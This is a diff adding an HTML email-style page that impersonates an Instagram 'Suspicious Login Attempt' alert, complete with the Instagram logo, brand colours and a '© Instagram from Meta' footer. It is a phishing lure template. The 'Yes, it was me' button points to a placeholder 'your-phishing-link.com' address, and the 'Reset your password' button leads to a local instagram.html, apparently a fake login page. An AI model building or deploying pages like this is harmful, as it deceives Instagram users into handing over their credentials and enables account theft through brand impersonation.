@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Suspicious Login Attempt</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background: #f4f4f4;
+    }
+
+    .container {
+      max-width: 500px;
+      margin: 30px auto;
+      background: #ffffff;
+      border-radius: 8px;
+      padding: 30px 20px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.08);
+      text-align: center;
+    }
+
+    .logo {
+      width: 90px;
+    }
+
+    .alert {
+      background-color: #ed4956;
+      color: white;
+      padding: 10px;
+      margin-top: 20px;
+      border-radius: 4px;
+      font-weight: bold;
+      font-size: 14px;
+    }
+
+    h2 {
+      color: #262626;
+      margin-top: 25px;
+      font-size: 22px;
+    }
+
+    p {
+      color: #555;
+      font-size: 25px;
+      margin: 40px 0;
+    }
+
+    .button {
+      display: inline-block;
+      padding: 12px 20px;
+      margin: 10px 5px;
+      font-weight: bold;
+      text-decoration: none;
+      color: #fff;
+      border-radius: 6px;
+      font-size: 14px;
+    }
+
+    .yes-btn {
+        color: black;
+      background-color: #07992c;
+    }
+
+    .reset-btn {
+        color: white;
+      background-color: #ed4956;
+    }
+
+    .footer {
+      font-size: 12px;
+      color: #999;
+      margin-top: 30px;
+    }
+
+    @media (max-width: 500px) {
+      .button {
+        display: block;
+        width: 80%;
+        margin: 10px auto;
+      }
+
+      .container {
+        padding: 25px 15px;
+      }
+
+      h2 {
+        font-size: 20px;
+      }
+
+      .alert {
+        font-size: 13px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/512px-Instagram_logo.svg.png" alt="Instagram Logo" class="logo">
+
+    <div class="alert">Suspicious Login Attempt</div>
+
+    <h2>We Detected an Unusual Login Attempt</h2>
+    <p>Is this you?</p>
+
+    <a href="https://your-phishing-link.com/yes" class="button yes-btn">Yes, it was me</a>
+    <a href="instagram.html" class="button reset-btn">Reset your password</a>
+
+    <p class="footer">© Instagram from Meta</p>
+  </div>
+
+</body>
+</html>
